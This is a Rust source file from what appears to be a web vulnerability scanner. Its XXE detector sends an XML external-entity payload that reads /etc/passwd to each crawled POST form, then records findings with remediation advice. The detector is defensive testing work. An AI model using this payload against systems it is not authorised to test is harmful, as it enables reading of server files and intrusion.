use reqwest::Client;
use crate::models::vulnerability::{Vulnerability, VulnCategory, OwaspCategory, Evidence, EvidenceType};
use crate::models::scan::Severity;
use crate::modules::crawler::CrawlResult;
use tracing::{info, warn};

pub struct XxeDetector {
    client: Client,
    #[allow(dead_code)]
    base_url: String,
}

impl XxeDetector {
    pub fn new(base_url: String) -> Self {
        let client = Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(std::time::Duration::from_secs(10))
            .build()
            .unwrap();
        Self { client, base_url }
    }

    pub async fn detect(&self, crawl_result: &CrawlResult) -> Vec<Vulnerability> {
        info!("Testing for XML External Entity (XXE) Injection...");
        let mut vulns = vec![];

        let xxe_payload = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><input>&xxe;</input></data>"#;

        for form in &crawl_result.forms {
            if form.method == "POST" {
                // If we detect a POST endpoint, we try sending XML to see if it parses it.
                // In a real scenario, we'd only do this for endpoints that expect XML, 
                // but many JSON endpoints silently accept XML if the content-type is changed.
                
                match self.client.post(&form.action)
                    .header("Content-Type", "application/xml")
                    .body(xxe_payload)
                    .send()
                    .await 
                {
                    Ok(resp) => {
                        let body = resp.text().await.unwrap_or_default();
                        
                        if body.contains("root:x:0:0:") {
                            warn!("XXE Vulnerability found at {}", form.action);
                            
                            vulns.push(Vulnerability::new(
                                "XML External Entity (XXE) Injection",
                                "The application parses XML input and allows external entities. This allows attackers to read local files on the server (like /etc/passwd) and potentially execute SSRF attacks via XML.",
                                Severity::High,
                                VulnCategory::Xxe,
                                form.action.clone(),
                            )
                            .with_remediation("Disable XML External Entity and DTD processing in your XML parser. If you use Java, configure DocumentBuilderFactory to disallow DOCTYPE declarations. Use JSON instead of XML where possible.")
                            .with_owasp(OwaspCategory::A05SecurityMisconfiguration)
                            .with_cwe(611)
                            .with_evidence(Evidence {
                                evidence_type: EvidenceType::HttpResponse,
                                request: Some(format!("POST {}\nContent-Type: application/xml\n\n{}", form.action, xxe_payload)),
                                response: Some(body.chars().take(300).collect()),
                                payload: Some(xxe_payload.to_string()),
                                screenshot_path: None,
                                description: "/etc/passwd contents returned in response".to_string(),
                            }));
                        }
                    }
                    Err(_) => {}
                }
            }
        }

        vulns
    }
}
